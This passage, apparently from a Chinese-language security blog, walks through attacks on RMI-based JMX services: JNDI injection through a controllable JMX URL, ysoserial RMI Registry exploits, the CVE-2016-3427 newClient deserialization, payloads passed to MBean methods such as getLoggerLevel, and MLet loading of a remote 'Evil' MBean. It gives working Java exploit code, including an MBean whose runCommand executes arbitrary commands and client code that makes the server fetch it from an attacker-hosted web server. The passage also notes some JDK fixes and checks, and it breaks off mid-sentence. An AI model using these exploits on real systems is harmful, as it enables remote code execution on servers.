jmx-url连接地址可控的JNDI注入利用方式</h3><p>使用Java代码JMXConnectorFactory#connect连接JMX服务端时，会调用到InitialContext#lookup去获取名称为”jmxrmi”的远端对象。当JMX url可控时，会造成JNDI注入的问题，调用栈及演示如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">JMX JNDI Gadget:<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.JMXConnectorFactory</span><span class="hljs-selector-class">.connect</span>(JMXConnectorFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">270</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.connect</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">287</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.findRMIServer</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1922</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.findRMIServerJNDI</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1955</span>)<br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.InitialContext</span><span class="hljs-selector-class">.lookup</span>(InitialContext<span class="hljs-selector-class">.java</span>:<span class="hljs-number">417</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/6.png"></p><p>起个恶意LDAP服务，javaReferenceAddress放置我们的Groovy1链的Padyload，可以看到JMX客户端在JDK高版本的情况下成功触发命令执行。绕过原理见先前文章：<a href="https://pwnull.github.io/2022/jndi-injection-history/">当我们谈论JNDI注入时，我们在谈论什么</a></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/7.png"></p><p>JMX JNDI注入调用栈：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/8.png"></p><h3 id="2-2-攻击RMI-Registry的利用方式"><a href="#2-2-攻击RMI-Registry的利用方式" class="headerlink" title="2.2 攻击RMI Registry的利用方式"></a>2.2 攻击RMI Registry的利用方式</h3><p>因为JMX底层也是依据RMI进行通信，所以当JDK版本在低版本时，也可以使用攻击RMI Registry的exp进行攻击。且这种攻击方式的触发点是在RMI层，还未执行到JMX权限校验部分，所以不受JMX权限的限制</p><p>JEP290前的JDK8u112版本，使用默认ysoserial中的ysoserial.exploit.RMIRegistryExploit测试成功</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/9.png"></p><p>JEP290后的JDK131版本使用 UnicastRef 链绕过成功、141可使用改造后的lookup()+UnicastRef 链进行绕过</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/10.png"></p><p>测试JDK191版本下，在sun.management.jmxremote.SingleEntryRegistry#singleRegistryFilter触发检查，导致反序列化失败。</p><p>JMX服务端调试情况，在singleRegistryFilter触发白名单检查报错</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/11.png"></p><p>攻击端：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/12.png"></p><h3 id="2-3-RMI层”自定义”方法newClient利用方式-CVE-2016-3427"><a href="#2-3-RMI层”自定义”方法newClient利用方式-CVE-2016-3427" class="headerlink" title="2.3 RMI层”自定义”方法newClient利用方式-CVE-2016-3427"></a>2.3 RMI层”自定义”方法newClient利用方式-CVE-2016-3427</h3><p>当客户端使用<code>JMXConnectorFactory.connect</code>去连接服务端时，最终调用到<code>javax.management.remote.rmi.RMIServerImpl_Stub#newClient</code>发起连接。其实该方法符合我们在攻击RMI Registry中提到的“应用层反序列化问题”情况：newClient方法参数为Object类型，可以塞入我们的恶意Padyload（利用JMXConnector.CREDENTIALS配置添加），exp如下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>    <span class="hljs-keyword">Object</span> obj = <span class="hljs-built_in">new</span> Groovy1().getObject(&quot;calc&quot;);<br>    connectWithJmxUrlByObject(obj);<br>&#125;<br><br>private static <span class="hljs-type">void</span> connectWithJmxUrlByObject(<span class="hljs-keyword">Object</span> credentials) throws MalformedURLException, IOException &#123;<br>    String url = &quot;service:jmx:rmi:///jndi/rmi://192.168.232.145:2222/jmxrmi&quot;;<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Trying to connect to &quot; + url + &quot; ...&quot;);<br>    Map&lt;String, <span class="hljs-keyword">Object</span>&gt; props = <span class="hljs-built_in">new</span> HashMap&lt;&gt;();<br>    props.put(JMXConnector.CREDENTIALS, credentials);<br>    JMXConnector connector = JMXConnectorFactory.<span class="hljs-keyword">connect</span>(<span class="hljs-built_in">new</span> JMXServiceURL(url), props);<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Connected: &quot; + connector.getConnectionId());<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println();<br>    connector.<span class="hljs-keyword">close</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>成功在JDK8u77-JMX服务上执行成功：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/13.png"></p><p>该漏洞在JDK8u91时被修复，新增了javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper类继承自DeserializationChecker接口，该类实现了check、checkProxyClass方法检查参数类型，限制只能为[Ljava.lang.String;、java.lang.String类型。</p><p>在该版本的环境下，RMI层使用sun.rmi.server.UnicastServerRef#unmarshalParameters方法还原”自定义方法”参数时，由于jmx服务注册Target的weakImpl#referent为ExportedWrapper，所以在还原操作时会调用到ExportedWrapper#check检查序列化是否在白名单中，很显然Groovy1外部包装类AnnotationInvocationHandler不在白名单中，反序列化操作报错</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/14.png"></p><p>javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper实现DeserializationChecker接口</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/15.png"></p><p>JMX服务端调用sun.rmi.server.UnicastServerRef#unmarshalParameters还原newClient的参数：由于实现了DeserializationChecker接口，所以会走checked流程。普通RMI服务的自定义方法会走unchecked流程</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/16.png"></p><p>服务端执行反序列化操作还原参数检查白名单：javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper#check</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/17.png"></p><p>此漏洞被分配编号<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3427">CVE-2016-3427</a>，在JDK8u91时被<a href="https://www.oracle.com/java/technologies/javase/8u91-relnotes.html">修复</a></p><h3 id="2-4-JMX层MBean方法getLoggerLevel-x2F-gcClassHistogram利用方式"><a href="#2-4-JMX层MBean方法getLoggerLevel-x2F-gcClassHistogram利用方式" class="headerlink" title="2.4 JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式"></a>2.4 JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式</h3><p>当JMX客户端调用createMBean&#x2F;getObjectInstance&#x2F;invoke等方法时，服务端处理时会先经过sun.rmi.server.UnicastServerRef#dispatch进行分发，当不执行RMI内置的bind&#x2F;lookup&#x2F;dirty方法时，会进入”调用自定义方法”的逻辑</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/18.png"></p><p>客户端调用createMBean&#x2F;getAttribute等内置方法时，服务端到达javax.management.remote.rmi.RMIConnectionImpl#invoke中：</p><p>1、调用java.rmi.MarshalledObject#get还原参数值</p><p>2、调用到javax.management.remote.rmi.RMIConnectionImpl#doOperation根据客户端调用具体方法进行分发处理，包括createMBean、getAttribute、getObjectInstance、getObjectInstance等方法</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/19.png"></p><p>java.rmi.MarshalledObject#get</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/20.png"></p><p>javax.management.remote.rmi.RMIConnectionImpl#doOperation</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/21.png"></p><p>在使用java.rmi.MarshalledObject#get还原调用方法的参数值时，会直接调用readObject进行反序列化操作。我们只需要找到MBean中带参数的方法，将我们的恶意数据填充即可，对应exp为ysoserial中的ysoserial.exploit.JMXInvokeMBean，该exp通过调用对象名称为”java.util.logging:type&#x3D;Logging”的MBean的getLoggerLevel方法触发</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String serverName = <span class="hljs-string">&quot;192.168.232.145&quot;</span>;<br>String servicePort = <span class="hljs-string">&quot;2222&quot;</span>;<br>JMXServiceURL url = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + <span class="hljs-params">serverName</span> + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-params">servicePort</span> +  <span class="hljs-string">&quot;/jmxrmi&quot;</span>)</span>;<br>JMXConnector jmxConnector = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(url);<br>MBeanServerConnection mbeanServerConnection = jmxConnector.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br>Object payloadObject = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utils</span>.</span></span>make<span class="hljs-constructor">PayloadObject(<span class="hljs-string">&quot;Groovy1&quot;</span>, <span class="hljs-string">&quot;mspaint.exe&quot;</span>)</span>;<br>ObjectName mbeanName = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectName(<span class="hljs-string">&quot;java.util.logging:type=Logging&quot;</span>)</span>;<br>mbeanServerConnection.invoke(mbeanName, <span class="hljs-string">&quot;getLoggerLevel&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;payloadObject&#125;, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">CanonicalName()</span>&#125;);<br>jmxConnector.close<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/22.png"></p><p>jconsole查看java.util.logging:type&#x3D;Logging为默认的MBean，另外还有很多MBean的方法也可以用：java.lang:type&#x3D;Threading#getThreadCpuTime、java.lang:type&#x3D;Threading#getThreadInfo、com.sun.management:type&#x3D;DiagnosticCommand#gcClassHistogram等等</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/23.png"></p><p>com.sun.management:type&#x3D;DiagnosticCommand#gcClassHistogram利用</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/24.png"></p><h3 id="2-5-MLET动态加载Evil-MBean利用方式"><a href="#2-5-MLET动态加载Evil-MBean利用方式" class="headerlink" title="2.5 MLET动态加载Evil MBean利用方式"></a>2.5 MLET动态加载Evil MBean利用方式</h3><p>除了利用本身存在的MBean，我们也可以自行添加MBean进行利用，可以使用<code>javax.management.loading.MLet</code> MBean 并调用其getMBeansFromURL操作指示JMX服务端从远端加载注册构建的恶意MBean，这样就可以调用我们创建的的MBean操作而不需要服务端ClassPath存在Gadget。这种从外部加载MBean的方式在官方也有说明 <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html">https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html</a></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/25.png"></p><p>分析下getMBeansFromURL方法是如何操作的，javax.management.loading.MLet#getMBeansFromURL(java.lang.String)中分为2步：</p><p>1、加载mlet文件解析标签</p><p>2、当创建MBean指定的class在本地ClassPath中找不到时，则使用MLET classloader去外部地址（第一步得到的codebase+archive属性值）进行加载</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/26.png"></p><p>javax.management.loading.MLetParser#parse解析<code>&lt;mlet&gt;</code>标签的内容并放入attributes</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/27.png"></p><p>接着返回到getMBeansFromURL方法调用com.sun.jmx.mbeanserver.JmxMBeanServer#createMBean创建MBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/28.png"></p><p>调用到com.sun.jmx.interceptor.DefaultMBeanServerInterceptor#createMBean创建MBean时，会检查是否有instantiate、registerMBean权限。如果未开启SecurityManager，则会跳过检查</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/29.png"></p><p>最终在 com.sun.jmx.mbeanserver.MBeanInstantiator#loadClass中使用MLET classloader去加载org.example.Evil类（codesource就是mlet文件中codebase+archive属性值）。这里使用<code>Class.forName(className, false, loader);</code>初始化的选项为false，不会执行静态代码块中的代码。所以我们需要选择invoke调用MBean的恶意方法进行利用</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/30.png"></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/31.png"></p><p>针对前文在2222端口开启的JMX服务，复现下MLET这种利用方法：</p><p>1、创建Evil类及EvilMBean接口（恶意操作为runCommand），并将其打包为JmxEvilBean.jar</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//EvilMBean.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">EvilMBean</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd);<br>&#125;<br><br><span class="hljs-comment">//Evil.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> <span class="hljs-keyword"><span class="hljs-keyword">implements</span> <span class="hljs-type">EvilMBean</span></span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> runCommand(<span class="hljs-keyword">String</span> cmd)<br>    &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime rt = Runtime.getRuntime();<br>            Process proc = rt.exec(cmd);<br>            BufferedReader stdInput = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getInputStream()));<br>            BufferedReader stdError = <span class="hljs-keyword">new</span> <span class="hljs-type">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">InputStreamReader</span>(proc.getErrorStream()));<br>            <span class="hljs-keyword">String</span> stdout_err_data = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">String</span> s;<br>            <span class="hljs-keyword">while</span> ((s = stdInput.readLine()) != <span class="hljs-literal">null</span>)<br>            &#123;<br>                stdout_err_data += s+<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">while</span> ((s = stdError.readLine()) != <span class="hljs-literal">null</span>)<br>            &#123;<br>                stdout_err_data += s+<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>            proc.waitFor();<br>            <span class="hljs-keyword">return</span> stdout_err_data;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)<br>        &#123;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2、创建MLET文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;mlet <span class="hljs-attribute">code</span>=<span class="hljs-string">&quot;org.example.Evil&quot;</span> <span class="hljs-attribute">archive</span>=<span class="hljs-string">&quot;JmxEvilBean.jar&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;MLetCompromise:name=evil,id=10&quot;</span> <span class="hljs-attribute">codebase</span>=<span class="hljs-string">&quot;http://192.168.232.1:3333&quot;</span>&gt;&lt;/mlet&gt;<br></code></pre></td></tr></table></figure><p>将JmxEvilBean.jar、mlet文件放在web服务下：python -m SimpleHTTPServer 3333</p><p>3、EXP利用：连接服务、创建MLet MBean、invoke调用getMBeansFromURL加载外部Evil MBean、invoke调用Evil MBean的runCommand操作返回执行结果</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String serverName = <span class="hljs-string">&quot;192.168.232.145&quot;</span>;<br>String port = <span class="hljs-string">&quot;2222&quot;</span>;<br>String command = <span class="hljs-string">&quot;ipconfig&quot;</span>;<br><span class="hljs-comment">//1、连接JMX服务</span><br>JMXServiceURL u = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + <span class="hljs-params">serverName</span> + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-params">port</span> + <span class="hljs-string">&quot;/jmxrmi&quot;</span>)</span>;<br>JMXConnector c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(u);<br>MBeanServerConnection m = c.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br><span class="hljs-comment">//2、创建MBean,类为javax.management.loading.MLet、name为test.Mbean:type=MLet,id=1</span><br>ObjectInstance evil = m.create<span class="hljs-constructor">MBean(<span class="hljs-string">&quot;javax.management.loading.MLet&quot;</span>, <span class="hljs-params">new</span> ObjectName(<span class="hljs-string">&quot;test.Mbean:type=MLet,id=1&quot;</span>)</span>);<br><span class="hljs-comment">//3、调用MBean的getMBeansFromURL操作，从http://192.168.232.1:3333/mlet加载mlet文件创建新的MBean</span><br>Object res = m.invoke(evil.get<span class="hljs-constructor">ObjectName()</span>, <span class="hljs-string">&quot;getMBeansFromURL&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;http://192.168.232.1:3333/mlet&quot;</span>&#125;,<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span> &#123; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span> &#125; );<br><br>HashSet res_set = ((HashSet)res);<br>Iterator itr = res_set.iterator<span class="hljs-literal">()</span>;<br>Object nextObject = itr.next<span class="hljs-literal">()</span>;<br><span class="hljs-comment">//4、invoke调用新的MBean的runCommand操作并返回结果</span><br>ObjectInstance evil_bean = ((ObjectInstance)nextObject);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Loaded class: &quot;</span>+evil_bean.get<span class="hljs-constructor">ClassName()</span>+<span class="hljs-string">&quot; object &quot;</span>+evil_bean.get<span class="hljs-constructor">ObjectName()</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Calling runCommand with: &quot;</span>+command);<br>Object result = m.invoke(evil_bean.get<span class="hljs-constructor">ObjectName()</span>, <span class="hljs-string">&quot;runCommand&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123; command &#125;, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span> &#125;);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Result: &quot;</span>+result);<br></code></pre></td></tr></table></figure><p>exp运行后，可以在jconsole中看到创建的test.Mbean:type&#x3D;MLet,id&#x3D;1、MLetCompromise:name&#x3D;evil,id&#x3D;10 MBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/32.png"></p><p>EXP也回显了ipconfig命令执行的结果</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/33.png"></p><p>需要注意的是：当服务未重启的情况下，后续利用直接invoke调用runCommand就可以了，不需要再次创建MBean</p><h2 id="3、密码验证"><a href="#3、密码验证" class="headerlink" title="3、密码验证"></a>3、密码验证</h2><p>第二章节分析的是JMX服务未开启权限验证及SSL验证时的漏洞利用情况，另外分析下当开启权限验证时漏洞利用的情况有什么变化。默认启动JMX管理服务时（不指定com.sun.management.jmxremote.authenticate配置），远程客户端连接时就需要通过验证。而验证所需的密码-权限是以明文存储在服务端&#x2F;jre&#x2F;lib&#x2F;management&#x2F;目录的jmxremote.password、jmxremote.access文件中的，且需要设置这两个文件的权限为：除文件所有者具有控制权，其它用户无任何权限。否则启动时会报错：sun.management.AgentConfigurationError。如下是启动命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Xmx5g -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span> -Dcom.sun.management.jmxremote.port=<span class="hljs-number">2222</span> -Dcom.sun.management.jmxremote.ssl=false -cp jmxserver.jar;C:\tools\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>-repository\org\codehaus\groovy\groovy\<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>\groovy-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>.jar org.example.MBeanExample<br></code></pre></td></tr></table></figure><p>启动截图及文件权限如下：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/34.png"></p><p>使用客户端jconsole 以只读账户guest password1进行连接</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/35.png"></p><p>也可以使用JAVA代码连接：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">HashMap env = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;<br>env.put(<span class="hljs-string">&quot;jmx.remote.credentials&quot;</span>,<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;guest&quot;</span>,<span class="hljs-string">&quot;password1&quot;</span>&#125;);<br>JMXServiceURL u = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://192.168.232.145:2222/jmxrmi&quot;</span>)</span>;<br>JMXConnector c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(u,env);<br>MBeanServerConnection m = c.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(m.get<span class="hljs-constructor">MBeanCount()</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/36.png"></p><p>文件权限设置参考：<a href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/security-windows.html">https://docs.oracle.com/javase/7/docs/technotes/guides/management/security-windows.html</a></p><p>分析下当加入权限验证后，JMX服务端的检测逻辑是怎样的？当我们获取了一个低权限&#x2F;只读权限账户时可以做哪些事情？我们从连接服务端到执行MBean操作的整体流程来看，分为几步：</p><p>1、客户端使用javax.naming.InitialContext#lookup获取到名称为”jmxrmi”的 Stub代理对象，即下图的变量server；</p><p>2、客户端调用javax.management.remote.rmi.RMIServer#newClient去获取RMIConnectionImpl Stub代理对象，服务端javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper#newClient执行JAAS-based authenticator进行权限校验：根据服务的启动参数及jmxremote.password、jmxremote.access配置文件去匹配，当校验通过后返回代理对象，即下图的变量c；</p><p>3、客户端invoke调用RMIConnectionImpl Stub代理对象的方法去操作MBean&#x2F;获取MBean信息。在另一边的JMX服务端会根据objid确认处理客户端此次请求逻辑的Target，[0:0:0,0]、[0:0:0,2] 这是在之前攻击RMI中分析过的RegistryImpl_Stub、DGCImpl_Stub，而涉及JMX是另外几个Target，在本实例中的objID为：[613d5ccd:18470553d20:-7fff, -4868886411976892153]、[613d5ccd:18470553d20:-7ffa, -8893277592355947578]，如下图是客户端拿到两次请求的返回对象调试情况</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/37.png"></p><p>当调用MBean的具体操作方法时，如javax.management.remote.rmi.RMIConnection#getConnectionId，在服务端会调用到javax.management.remote.rmi.RMIConnectionImpl#getConnectionId进行处理</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/38.png"></p><p>添加鉴权前后，由于服务端在启动时添加的Target不同，在添加鉴权后 mbeanServer的值从DefaultMBeanServerInterceptor变为MBeanServerAccessController，对于每个操作具体需要的权限都在MBeanServerAccessController中进行判断（objid与上面演示的不同，因为是后面的补图）</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/39.png"></p><p>无鉴权时：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#createMBean</span>(java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>, javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.ObjectName</span>, javax<span class="hljs-selector-class">.security</span><span class="hljs-selector-class">.auth</span>.Subject)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doPrivilegedOperation</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnectionImpl</span>.PrivilegedOperation<span class="hljs-selector-id">#run</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doOperation</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span><span class="hljs-selector-class">.interceptor</span>.DefaultMBeanServerInterceptor<span class="hljs-selector-id">#createMBean</span>(<br>....<br></code></pre></td></tr></table></figure><p>有鉴权时：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#createMBean</span>(java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>, javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.ObjectName</span>, javax<span class="hljs-selector-class">.security</span><span class="hljs-selector-class">.auth</span>.Subject)<br>javax<span class="hljs-selector-class">.management</span><span 